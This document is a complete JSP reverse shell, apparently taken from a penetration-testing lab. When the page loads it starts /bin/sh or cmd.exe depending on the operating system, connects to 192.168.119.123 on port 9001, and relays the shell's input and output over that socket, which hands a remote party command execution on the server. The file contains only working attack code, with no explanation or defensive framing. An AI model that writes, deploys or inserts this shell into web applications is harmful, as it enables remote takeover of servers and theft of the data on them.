<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream b3;
    OutputStream ez;

    StreamConnector( InputStream b3, OutputStream ez )
    {
      this.b3 = b3;
      this.ez = ez;
    }

    public void run()
    {
      BufferedReader rw  = null;
      BufferedWriter bpP = null;
      try
      {
        rw  = new BufferedReader( new InputStreamReader( this.b3 ) );
        bpP = new BufferedWriter( new OutputStreamWriter( this.ez ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = rw.read( buffer, 0, buffer.length ) ) > 0 )
        {
          bpP.write( buffer, 0, length );
          bpP.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( rw != null )
          rw.close();
        if( bpP != null )
          bpP.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "192.168.119.123", 9001 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
